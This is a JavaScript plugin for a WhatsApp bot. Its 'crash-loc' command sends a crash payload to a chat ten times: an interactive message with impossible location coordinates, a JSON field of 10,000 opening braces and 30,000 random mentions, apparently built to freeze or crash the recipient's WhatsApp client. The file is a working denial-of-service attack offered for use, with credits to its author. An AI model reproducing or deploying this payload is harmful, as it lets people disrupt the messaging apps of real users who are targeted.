import fs from 'fs'

let handler = async (m, { conn }) => {
  let target = m.chat // ya sea grupo o privado

  m.reply(`‚ò†Ô∏è Enviando crash a: ${target}...`)

  try {
    for (let i = 0; i < 10; i++) {
      await crash(conn, target)
      await delay(4000) // espera 4 segundos entre cada uno
    }

    await conn.sendMessage(target, {
      text: "‚úÖ ùêÇùêëùêÄùêíùêá ùêãùêéùêÇ ùêÑùêçùêïùêàùêÄùêÉùêé\n\nüîπ Por: ùêè.ùêÄ. ùêôùê¢ùêß ùêñùêûùêõ\nüîπ Bot: ùêôùêÑùêìùêÄùêí ùêÅùêéùêì ùêïùüì",
    })

  } catch (e) {
    console.log("‚ùå Error al enviar crash:", e)
    m.reply("‚ùå Error enviando el crash.")
  }
}

handler.command = /^crash-loc$/i
export default handler

// üëá FUNCI√ìN DE CRASH (sin cambios)
async function crash(conn, target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ùêÇùêëùêÄùêíùêá ùêáùêéùêåùêÑ üò≠",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "https://youtube.com/@p.a.zinwebkkkkj",
                address: "ùêôùêÑùêìùêÄùêí ùêÅùêéùêì ùêïùüì",
              },
            },
            body: {
              text: "ùêè.ùêÄ. ùêôùê¢ùêß ùêñùêûùêõ </>",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    }

    await conn.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    })
  } catch (err) {
    console.log("‚ùå Crash error:", err)
  }
}

// üëá Funci√≥n delay
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}